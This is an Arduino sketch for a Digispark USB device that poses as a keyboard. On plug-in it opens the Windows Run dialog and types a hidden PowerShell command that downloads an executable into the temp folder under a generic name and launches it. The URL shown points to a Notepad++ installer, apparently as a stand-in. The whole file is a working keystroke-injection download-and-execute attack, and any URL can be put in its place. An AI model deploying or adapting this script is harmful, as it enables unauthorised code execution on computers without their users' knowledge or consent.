#include "DigiKeyboard.h"

void winRun(const char* command){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT  ); // press the windows key
  DigiKeyboard.delay(300); // wait a second
  DigiKeyboard.println(command);
}

void downloadAndRun(){
  DigiKeyboard.delay(500);
  winRun("powershell -W Hidden \"cd $env:temp; $outpath = 'programik.exe'; Invoke-WebRequest -Uri 'https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.3.1/npp.8.3.1.Installer.x64.exe' -OutFile $outpath; Start-Process -Filepath $outpath;\"");
}
void setup() {
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  
  downloadAndRun(); 
}

void loop() {
  DigiKeyboard.update();
}
